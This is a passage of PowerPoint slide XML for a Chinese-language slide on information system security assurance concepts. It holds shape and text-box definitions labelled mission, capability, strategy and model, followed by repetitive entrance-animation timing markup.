            </a:solidFill>
            <a:round/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="2000">
              <a:solidFill>
                <a:schemeClr val="tx2"/>
              </a:solidFill>
              <a:latin typeface="宋体" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31763" name="Text Box 28"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3980640" y="1466071"/>
            <a:ext cx="1661269" cy="387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sz="2000" b="1">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
                <a:latin typeface="宋体" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>使命</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31764" name="Oval 13"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3597090" y="4769907"/>
            <a:ext cx="1040058" cy="675389"/>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65" name="Text Box 14"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3597090" y="4837795"/>
            <a:ext cx="10682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b="1">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>能力</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31766" name="Line 20"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm flipV="1">
            <a:off x="4801863" y="2073574"/>
            <a:ext cx="0" cy="337695"/>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7" name="Line 21"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm flipV="1">
            <a:off x="3653564" y="2999622"/>
            <a:ext cx="534147" cy="62490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8" name="Line 22"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm flipH="1" flipV="1">
            <a:off x="5436096" y="2973755"/>
            <a:ext cx="710628" cy="743277"/>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9" name="Line 23"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4091235" y="3962225"/>
            <a:ext cx="1477729"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a typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31770" name="Line 24"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm flipH="1" flipV="1">
            <a:off x="3597090" y="4298180"/>
            <a:ext cx="430611" cy="47869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a typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31771" name="Line 25"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm flipV="1">
            <a:off x="2479380" y="4303401"/>
            <a:ext cx="541207" cy="511764"/>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a typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31772" name="Line 26"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm flipV="1">
            <a:off x="5736032" y="4298180"/>
            <a:ext cx="378845" cy="635353"/>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a typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31773" name="Line 27"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm flipH="1" flipV="1">
            <a:off x="6750207" y="4263366"/>
            <a:ext cx="745923" cy="63187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a typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31774" name="Oval 13"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1573448" y="5175489"/>
            <a:ext cx="1040058" cy="539615"/>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75" name="Oval 13"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1888760" y="4769907"/>
            <a:ext cx="1042410" cy="539615"/>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76" name="Text Box 25"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1834638" y="4837795"/>
            <a:ext cx="12047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b="1">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>策略</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31777" name="Text Box 20"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1189896" y="5309522"/>
            <a:ext cx="1663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en-US" altLang="zh-CN" b="1">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>模型</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31747" name="标题 34"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="225210" y="688882"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>信息系统安全保障相关概念和关系</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="11814219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51"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="31751"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="8" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="3175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752"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="11" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="31752"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="12" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="3175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1758"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="17" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="31758"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="18" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="3175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1759"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="21" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="31759"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="22" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="31759"/>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1760"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="25" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="31760"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="26" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="3176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1761"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="29" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="31761"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="30" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="31761"/>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1772"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="33" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="31772"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="34" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="3177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1773"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="37" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="31773"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="38" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="3177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1754"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="43" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="31754"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="44" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="3175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1757"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="47" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="31757"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="48" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="3175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1768"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="51" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="31768"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="52" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="31768"/>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31749"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="57" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="31749"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="58" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="31749"/>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1750"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="61" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="31750"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="62" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="31750"/>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1764"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="65" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="31764"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="66" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="31764"/>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1765"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="69" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="31765"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="70" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="31765"/>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1770"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="73" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="31770"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="74" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="31770"/>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1771"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="77" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="31771"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="78" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="31771"/>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1774"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="81" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="31774"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="82" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="31774"/>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31775"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="85" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="31775"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
